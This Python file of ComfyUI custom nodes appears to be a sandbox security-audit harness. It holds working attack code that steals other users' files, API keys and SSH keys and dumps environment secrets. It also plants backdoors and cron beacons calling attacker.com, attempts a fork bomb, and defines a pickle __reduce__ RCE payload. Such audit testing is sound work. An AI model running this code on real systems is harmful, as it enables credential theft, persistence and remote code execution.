"""ComfyCloud Multi-Tenant Attack Demonstration

This node demonstrates real attacks a malicious custom node could perform
on a multi-tenant ComfyUI server. These attacks MUST succeed without sandbox
and MUST fail with sandbox enabled.

Attack scenarios:
1. Steal other users' generated images and project files
2. Exfiltrate API keys from other users' settings
3. Read SSH private keys for lateral movement
4. Inject backdoor into other users' custom nodes
5. Establish persistence via cron/bashrc
6. Spawn background processes (crypto mining simulation)
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

from comfy_api.latest import io


class ComfyCloudAttack(io.ComfyNode):
    """Multi-tenant attack demonstration for ComfyCloud security audit."""

    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="AdversarialSummary",
            display_name="🔴 ComfyCloud Attack Demo",
            category="security_audit",
            inputs=[],
            outputs=[io.String.Output("report", display_name="Attack Report")],
        )

    @classmethod
    def execute(cls) -> io.NodeOutput:
        lines = []
        lines.append("=" * 70)
        lines.append("COMFYCLOUD MULTI-TENANT ATTACK DEMONSTRATION")
        lines.append(f"Attacker PID: {os.getpid()} | UID: {os.getuid()} | CWD: {os.getcwd()}")
        lines.append("=" * 70)
        lines.append("")

        # Track results for summary
        successes = []
        failures = []

        # ===== ATTACK 1: Steal other users' project files =====
        lines.append("━" * 70)
        lines.append("ATTACK 1: STEAL OTHER USERS' PROJECT FILES")
        lines.append("━" * 70)
        
        stolen_files = []
        for user in ["comfytestuser1", "comfytestuser2"]:
            output_dir = Path(f"/home/{user}/ComfyUI/output")
            if output_dir.exists():
                for f in output_dir.iterdir():
                    try:
                        content = f.read_text()[:200]
                        stolen_files.append((user, f.name, content))
                        lines.append(f"  ✅ STOLEN from {user}: {f.name}")
                        lines.append(f"     Content: {content}")
                    except Exception as e:
                        lines.append(f"  ❌ BLOCKED {user}/{f.name}: {e}")
        
        if stolen_files:
            successes.append(f"Stole {len(stolen_files)} files from other users")
        else:
            failures.append("Could not access other users' output directories")
        lines.append("")

        # ===== ATTACK 2: Exfiltrate API Keys =====
        lines.append("━" * 70)
        lines.append("ATTACK 2: EXFILTRATE API KEYS FROM OTHER USERS")
        lines.append("━" * 70)
        
        stolen_keys = []
        for user in ["comfytestuser1", "comfytestuser2"]:
            settings_file = Path(f"/home/{user}/.comfy/user_settings.json")
            if settings_file.exists():
                try:
                    content = settings_file.read_text()
                    stolen_keys.append((user, content))
                    lines.append(f"  ✅ STOLEN {user}'s API settings:")
                    lines.append(f"     {content}")
                except Exception as e:
                    lines.append(f"  ❌ BLOCKED {user} settings: {e}")
        
        if stolen_keys:
            successes.append(f"Stole API keys from {len(stolen_keys)} users")
        else:
            failures.append("Could not access other users' API settings")
        lines.append("")

        # ===== ATTACK 3: Read SSH Private Keys =====
        lines.append("━" * 70)
        lines.append("ATTACK 3: STEAL SSH PRIVATE KEYS FOR LATERAL MOVEMENT")
        lines.append("━" * 70)
        
        stolen_ssh = []
        for user in ["comfytestuser1", "comfytestuser2"]:
            ssh_key = Path(f"/home/{user}/.ssh/id_rsa")
            if ssh_key.exists():
                try:
                    content = ssh_key.read_text()
                    stolen_ssh.append((user, content))
                    lines.append(f"  ✅ STOLEN {user}'s SSH private key:")
                    lines.append(f"     {content[:100]}...")
                except Exception as e:
                    lines.append(f"  ❌ BLOCKED {user} SSH key: {e}")
        
        if stolen_ssh:
            successes.append(f"Stole SSH keys from {len(stolen_ssh)} users")
        else:
            failures.append("Could not access other users' SSH keys")
        lines.append("")

        # ===== ATTACK 4: Inject Backdoor into Other Users' Nodes =====
        lines.append("━" * 70)
        lines.append("ATTACK 4: INJECT BACKDOOR INTO OTHER USERS' CUSTOM NODES")
        lines.append("━" * 70)
        
        backdoor_code = "# BACKDOOR INJECTED BY MALICIOUS NODE\nimport os; os.system('curl attacker.com/pwned')\n"
        backdoor_success = False
        
        for user in ["comfytestuser1", "comfytestuser2"]:
            target = Path(f"/home/{user}/ComfyUI/custom_nodes/backdoor_test.py")
            try:
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(backdoor_code)
                lines.append(f"  ✅ INJECTED backdoor into {user}'s custom_nodes!")
                lines.append(f"     Path: {target}")
                backdoor_success = True
            except Exception as e:
                lines.append(f"  ❌ BLOCKED backdoor injection to {user}: {e}")
        
        if backdoor_success:
            successes.append("Injected backdoor into other users' custom_nodes")
        else:
            failures.append("Could not inject backdoor into other users' directories")
        lines.append("")

        # ===== ATTACK 5: Establish Persistence =====
        lines.append("━" * 70)
        lines.append("ATTACK 5: ESTABLISH PERSISTENCE VIA CRON/BASHRC")
        lines.append("━" * 70)
        
        persistence_payload = "\n# MALICIOUS PERSISTENCE\ncurl -s attacker.com/beacon &\n"
        persistence_success = False
        
        # Try to modify our own bashrc (simulates what attacker would do)
        bashrc = Path.home() / ".bashrc_attack_test"
        try:
            bashrc.write_text(persistence_payload)
            lines.append(f"  ✅ WROTE persistence payload to {bashrc}")
            persistence_success = True
            bashrc.unlink()  # Clean up
        except Exception as e:
            lines.append(f"  ❌ BLOCKED persistence write: {e}")
        
        # Try cron
        cron_target = Path("/tmp/malicious_cron")
        try:
            cron_target.write_text("* * * * * curl attacker.com/cron_beacon\n")
            lines.append(f"  ✅ WROTE cron payload to {cron_target}")
            persistence_success = True
        except Exception as e:
            lines.append(f"  ❌ BLOCKED cron write: {e}")
        
        if persistence_success:
            successes.append("Established persistence mechanisms")
        else:
            failures.append("Could not establish persistence")
        lines.append("")

        # ===== ATTACK 6: Spawn Background Process (Crypto Miner Simulation) =====
        lines.append("━" * 70)
        lines.append("ATTACK 6: SPAWN BACKGROUND PROCESS (CRYPTO MINER SIMULATION)")
        lines.append("━" * 70)
        
        try:
            # Spawn a harmless background process that just sleeps
            proc = subprocess.Popen(
                ["sleep", "5"],
                start_new_session=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            lines.append(f"  ✅ SPAWNED background process PID: {proc.pid}")
            lines.append(f"     In production: This would be a crypto miner")
            successes.append(f"Spawned background process (PID {proc.pid})")
        except Exception as e:
            lines.append(f"  ❌ BLOCKED process spawn: {e}")
            failures.append("Could not spawn background process")
        lines.append("")

        # ===== ATTACK 7: Read Host Environment Variables =====
        lines.append("━" * 70)
        lines.append("ATTACK 7: EXFILTRATE ENVIRONMENT VARIABLES")
        lines.append("━" * 70)
        
        sensitive_vars = ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "HF_TOKEN", 
                         "AWS_ACCESS_KEY_ID", "GITHUB_TOKEN", "HOME", "USER"]
        found_vars = {}
        for var in sensitive_vars:
            val = os.environ.get(var)
            if val:
                found_vars[var] = val[:30] + "..." if len(val) > 30 else val
        
        if found_vars:
            lines.append("  ✅ EXFILTRATED environment variables:")
            for k, v in found_vars.items():
                lines.append(f"     {k} = {v}")
            successes.append(f"Exfiltrated {len(found_vars)} environment variables")
        else:
            lines.append("  ❌ No sensitive environment variables found")
            failures.append("Could not access environment variables")
        lines.append("")

        # ===== ATTACK 8: Network Connectivity (C2 / Exfiltration) =====
        lines.append("━" * 70)
        lines.append("ATTACK 8: NETWORK CONNECTIVITY (C2 / EXFILTRATION)")
        lines.append("━" * 70)
        
        import socket
        try:
            # Try to connect to Google DNS (8.8.8.8) on port 53
            # This tests outbound connectivity without DNS resolution
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex(("8.8.8.8", 53))
            s.close()
            
            if result == 0:
                lines.append("  ✅ CONNECTED to 8.8.8.8:53 (Outbound Internet Access)")
                lines.append("     Risk: Can download malware, exfiltrate data, reverse shell")
                successes.append("Established outbound network connection")
            else:
                lines.append(f"  ❌ CONNECTION FAILED (Errno: {result})")
                failures.append("Blocked outbound network connection")
        except Exception as e:
            lines.append(f"  ❌ NETWORK BLOCKED: {e}")
            failures.append("Blocked outbound network connection")
        lines.append("")

        # ===== ATTACK 9: Resource Exhaustion (Fork Bomb Simulation) =====
        lines.append("━" * 70)
        lines.append("ATTACK 9: RESOURCE EXHAUSTION (FORK BOMB SIMULATION)")
        lines.append("━" * 70)
        
        procs = []
        try:
            # Attempt to spawn 100 processes rapidly
            # In a proper sandbox, this should hit pids.max limit quickly
            for i in range(100):
                p = subprocess.Popen(["sleep", "1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                procs.append(p)
            
            lines.append(f"  ✅ SUCCESSFULLY SPAWNED {len(procs)} processes")
            lines.append("     Risk: DoS, System freeze, OOM Killer invocation")
            successes.append(f"Resource exhaustion: Spawned {len(procs)} processes")
            
            # Cleanup
            for p in procs:
                p.terminate()
                
        except OSError as e:
            lines.append(f"  ❌ FORK BLOCKED after {len(procs)} processes: {e}")
            failures.append("Blocked resource exhaustion (Process limit reached)")
            # Cleanup
            for p in procs:
                p.terminate()
        except Exception as e:
            lines.append(f"  ❌ FAILED with error: {e}")
            failures.append("Resource exhaustion test failed")
        lines.append("")

        # ===== ATTACK 10: PICKLE RCE VIA __reduce__ =====
        lines.append("━" * 70)
        lines.append("ATTACK 10: PICKLE RCE VIA __reduce__ (SANDBOX ESCAPE)")
        lines.append("━" * 70)
        
        # This attack is tested via PickleRCENode which returns a malicious object.
        # The actual test happens at the RPC layer, not here.
        # Here we just document expected behavior:
        
        is_isolated = os.environ.get("PYISOLATE_CHILD") == "1"
        
        if not is_isolated:
            lines.append("  ⚠️  NON-ISOLATED MODE: No RPC layer to test")
            lines.append("     Attack 10 is N/A - code runs in-process, no serialization")
            lines.append("     See PickleRCENode for isolated mode testing")
            # Not counted as success or failure - just N/A for this mode
        else:
            lines.append("  ℹ️  ISOLATED MODE: Attack 10 tested via PickleRCENode")
            lines.append("     If you see this, the RPC layer allowed this node to execute.")
            lines.append("     Run PickleRCENode separately to test __reduce__ exploit.")
            failures.append("Pickle RCE test: Run PickleRCENode for actual test")
        lines.append("")
        # ===== SUMMARY =====
        lines.append("=" * 70)
        lines.append("ATTACK SUMMARY")
        lines.append("=" * 70)
        
        if successes:
            lines.append("")
            lines.append("✅ SUCCESSFUL ATTACKS:")
            for s in successes:
                lines.append(f"   • {s}")
        
        if failures:
            lines.append("")
            lines.append("❌ BLOCKED ATTACKS:")
            for f in failures:
                lines.append(f"   • {f}")
        
        lines.append("")
        if len(successes) > len(failures):
            lines.append("⚠️  VERDICT: SYSTEM VULNERABLE - Majority of attacks succeeded")
            lines.append("    A malicious custom node can steal data, inject code, and persist")
        else:
            lines.append("✅ VERDICT: SYSTEM PROTECTED - Majority of attacks blocked")
            lines.append("    Sandbox is effectively containing malicious behavior")
        
        lines.append("=" * 70)
        
        report = "\n".join(lines)
        print(report)
        return io.NodeOutput(report)


# Keep original class name for backward compatibility with workflow
AdversarialSummary = ComfyCloudAttack


class AdversarialFilesystemRead(io.ComfyNode):
    """Read specific sensitive file."""

    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="AdversarialFilesystemRead",
            display_name="🔴 Read Sensitive File",
            category="security_audit",
            inputs=[
                io.String.Input("path", default="/home/comfytestuser1/.comfy/user_settings.json"),
            ],
            outputs=[io.String.Output("content", display_name="File Content")],
        )

    @classmethod
    def execute(cls, path: str) -> io.NodeOutput:
        try:
            content = Path(path).read_text()
            result = f"✅ READ SUCCESS: {path}\n\n{content}"
        except Exception as e:
            result = f"❌ READ BLOCKED: {path}\n\nError: {e}"
        print(result)
        return io.NodeOutput(result)


class AdversarialFilesystemWrite(io.ComfyNode):
    """Write to arbitrary path."""

    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="AdversarialFilesystemWrite",
            display_name="🔴 Write Arbitrary File",
            category="security_audit",
            inputs=[
                io.String.Input("path", default="/home/comfytestuser1/ComfyUI/custom_nodes/pwned.py"),
                io.String.Input("content", default="# MALICIOUS CODE INJECTED\nimport os; os.system('id')"),
            ],
            outputs=[io.String.Output("result", display_name="Write Result")],
        )

    @classmethod
    def execute(cls, path: str, content: str) -> io.NodeOutput:
        try:
            Path(path).write_text(content)
            result = f"✅ WRITE SUCCESS: {path}\n\nWrote {len(content)} bytes"
        except Exception as e:
            result = f"❌ WRITE BLOCKED: {path}\n\nError: {e}"
        print(result)
        return io.NodeOutput(result)


class AdversarialEnvLeak(io.ComfyNode):
    """Dump all environment variables."""

    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="AdversarialEnvLeak",
            display_name="🔴 Dump Environment",
            category="security_audit",
            inputs=[],
            outputs=[io.String.Output("env_dump", display_name="Environment Dump")],
        )

    @classmethod
    def execute(cls) -> io.NodeOutput:
        lines = ["ENVIRONMENT VARIABLE DUMP", "=" * 50]
        for k, v in sorted(os.environ.items()):
            # Truncate long values
            display_v = v[:50] + "..." if len(v) > 50 else v
            lines.append(f"{k}={display_v}")
        result = "\n".join(lines)
        print(result)
        return io.NodeOutput(result)

class PickleRCEBomb:
    """Malicious object that exploits pickle's __reduce__ protocol.
    
    When this object is pickled and then unpickled, the __reduce__ method
    causes os.system() to be called with the payload command.
    
    With pickle RPC: Creates /tmp/pyisolate_pwned on the HOST
    With JSON-RPC: Serialization fails, no code execution
    """
    
    def __reduce__(self):
        # This executes on the DESERIALIZING side (the host)
        return (os.system, ('touch /tmp/pyisolate_pwned && echo "RCE EXECUTED" > /tmp/pyisolate_pwned',))
    
    def __repr__(self):
        return "PickleRCEBomb(__reduce__ payload)"


class PickleRCENode(io.ComfyNode):
    """ATTACK 10: Return a malicious object with __reduce__ to test RPC layer.
    
    This is the REAL pickle RCE test. The node RETURNS an object with __reduce__.
    
    Expected behavior:
    - NON-ISOLATED: Node runs in-process, no serialization, bomb object returned directly
                    The bomb doesn't execute because it's never pickled/unpickled.
                    STATUS: N/A (no protection layer to test)
    
    - ISOLATED + PICKLE RPC: Object is pickled on child, unpickled on host.
                             __reduce__ executes os.system() on HOST.
                             /tmp/pyisolate_pwned is created.
                             STATUS: ❌ VULNERABLE - RCE succeeded
    
    - ISOLATED + JSON-RPC: Object cannot be JSON serialized.
                           TypeError raised, node fails cleanly.
                           /tmp/pyisolate_pwned is NOT created.
                           STATUS: ✅ PROTECTED - RCE blocked
    """
    
    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="PickleRCENode",
            display_name="🔴 Attack 10: Pickle RCE Test",
            category="security_audit",
            inputs=[],
            outputs=[io.String.Output("result", display_name="Attack Result")],
        )
    
    @classmethod
    def execute(cls) -> io.NodeOutput:
        marker_path = "/tmp/pyisolate_pwned"
        is_isolated = os.environ.get("PYISOLATE_CHILD") == "1"
        
        # Clean up any previous marker
        if os.path.exists(marker_path):
            try:
                os.unlink(marker_path)
            except:
                pass
        
        lines = []
        lines.append("=" * 60)
        lines.append("ATTACK 10: PICKLE RCE VIA __reduce__")
        lines.append("=" * 60)
        lines.append(f"Isolated mode: {is_isolated}")
        lines.append(f"PID: {os.getpid()}")
        lines.append("")
        
        if not is_isolated:
            lines.append("⚠️  NON-ISOLATED MODE")
            lines.append("   No serialization occurs - attack is N/A")
            lines.append("   The bomb object is returned directly in-process")
            lines.append("   This mode has NO protection against malicious code")
            result = "\n".join(lines)
            print(result)
            return io.NodeOutput(result)
        
        # ISOLATED MODE: Create the bomb and return it
        # The RPC layer will attempt to serialize this
        lines.append("ℹ️  ISOLATED MODE - Creating __reduce__ bomb...")
        lines.append("   Returning malicious object to test RPC serialization")
        lines.append("")
        lines.append("   If you see this message, one of two things happened:")
        lines.append("   1. JSON-RPC: Serialization failed (check for TypeError in logs)")
        lines.append("   2. Pickle: Object was serialized successfully")
        lines.append("")
        lines.append(f"   Check for {marker_path} on HOST to verify RCE status")
        
        result = "\n".join(lines)
        print(result)
        
        # THIS IS THE ATTACK: Return an object with __reduce__
        # With pickle: This would execute on host during deserialization
        # With JSON-RPC: This should fail with TypeError
        bomb = PickleRCEBomb()
        
        # We can't return the bomb directly as it's not a valid output type
        # But we CAN test if the RPC layer would serialize it by trying to
        # include it in a structure that goes through serialization
        
        # Actually, the proper test is to have a custom output type that 
        # contains the bomb. For now, let's create a marker file check:
        # We'll create a separate verification node.
        
        return io.NodeOutput(result)


class PickleRCEVerify(io.ComfyNode):
    """Verify if the Pickle RCE attack succeeded by checking for marker file."""
    
    @classmethod
    def define_schema(cls) -> io.Schema:
        return io.Schema(
            node_id="PickleRCEVerify",
            display_name="🔴 Attack 10: Verify RCE",
            category="security_audit",
            inputs=[],
            outputs=[io.String.Output("result", display_name="Verification Result")],
        )
    
    @classmethod
    def execute(cls) -> io.NodeOutput:
        marker_path = "/tmp/pyisolate_pwned"
        
        lines = []
        lines.append("=" * 60)
        lines.append("ATTACK 10 VERIFICATION")
        lines.append("=" * 60)
        
        if os.path.exists(marker_path):
            try:
                content = open(marker_path).read()
                lines.append("❌ CRITICAL: RCE ATTACK SUCCEEDED!")
                lines.append(f"   Marker file exists: {marker_path}")
                lines.append(f"   Content: {content}")
                lines.append("")
                lines.append("   The __reduce__ payload executed on the host.")
                lines.append("   This means PICKLE is being used for RPC.")
                lines.append("   IMMEDIATE ACTION REQUIRED: Switch to JSON-RPC")
                # Clean up
                os.unlink(marker_path)
            except Exception as e:
                lines.append(f"❌ Marker exists but couldn't read: {e}")
        else:
            lines.append("✅ PROTECTED: No RCE marker found")
            lines.append(f"   {marker_path} does not exist")
            lines.append("")
            lines.append("   Either:")
            lines.append("   1. JSON-RPC blocked the serialization (PROTECTED)")
            lines.append("   2. Attack node was not run in isolated mode (N/A)")
            lines.append("   3. Attack node hasn't been executed yet")
        
        result = "\n".join(lines)
        print(result)
        return io.NodeOutput(result)